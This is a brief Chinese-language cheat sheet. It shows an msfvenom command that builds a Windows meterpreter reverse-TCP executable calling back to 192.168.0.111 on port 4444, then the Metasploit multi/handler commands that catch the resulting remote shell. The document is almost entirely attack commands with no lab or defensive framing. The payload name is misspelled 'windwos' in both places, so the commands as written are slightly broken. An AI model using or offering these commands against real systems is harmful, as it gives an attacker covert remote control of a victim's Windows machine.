生成windows被控端

```shell
msfvenom -p windwos/x64/meterpreter/reverse_tcp lhost=192.168.0.111 lport=4444 -f exe >windows.exe
```



连接靶机

```shell
use exploit/multi/handler

set payload windwos/x64/meterpreter/reverse_tcp 

set lhost 192.168.0.111

set lport 4444

exploit  ||  run
```

